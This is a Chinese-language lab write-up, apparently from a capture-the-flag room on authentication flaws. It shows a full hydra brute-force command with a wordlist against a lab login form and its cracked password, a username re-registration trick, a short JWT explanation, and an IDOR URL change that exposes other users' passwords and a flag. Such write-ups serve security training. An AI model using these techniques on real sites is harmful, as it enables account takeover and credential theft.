## task2 字典攻擊
mike
```
┌──(root💀kali)-[~]
└─# hydra -l mike -P /usr/share/wordlists/rockyou.txt "http-post-form://10.10.230.48:8888/login:user=^USER^&password=^PASS^:Invalid" -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-30 09:57:23
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.230.48:8888/login:user=^USER^&password=^PASS^:Invalid
[8888][http-post-form] host: 10.10.230.48   login: mike   password: 12345
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-30 09:57:49
```
## task3 重新註冊
多時候發生的情況是開發人員忘記清理用戶在其應用程序代碼中提供的輸入（用戶名和密碼），這可能使他們容易受到 SQL 注入之類的攻擊，但 SQLi 可能有點難以利用。因此，我們將重點關注由於開發人員的錯誤而發生但很容易被利用的漏洞，即重新註冊現有用戶。

讓我們通過一個例子來理解這一點，假設有一個名為admin的現有用戶，現在我們想要訪問他們的帳戶，所以我們可以做的是嘗試重新註冊該用戶名，但稍作修改。我們要輸入“admin”（注意開頭的空格）。現在，當您在用戶名字段中輸入該信息並輸入其他必需信息（如電子郵件 ID 或密碼）並提交該數據時。它實際上會註冊一個新用戶，但該用戶將擁有與普通管理員相同的權限。並且該新用戶還將能夠看到用戶admin下存在的所有內容。

## task4
JSON Web Token（JWT）是一種常用的授權方式。這是一種使用 HMAC 散列或公鑰/私鑰生成的 cookie。因此，與任何其他類型的 cookie 不同，它讓網站知道當前登錄的用戶擁有什麼樣的訪問權限。JWT 唯一的特別之處在於它們是 JSON 格式（解碼後）。



## task5 
```
我們在網站上看到，當我們註冊用戶並使用我們的憑據登錄時，我們會得到一個特定的 id，它要么完全是數字，要么以數字結尾。大多數情況下，開發人員會保護他們的應用程序，但有時在某些地方，只需更改該數字，我們就可以看到一些隱藏或私人數據。
```
註冊 登陸後            
http://10.10.230.48:7777/users/1?                       
改成         
http://10.10.230.48:7777/users/2? 
```
Hello admin!
Your password:
rootadmin
Your secret data:
I am the admin of this website.
```
http://10.10.230.48:7777/users/0?
```
Hello superadmin!
Your password:
abcd1234
Your secret data:
Here's your flag: 72102933396288983011
```
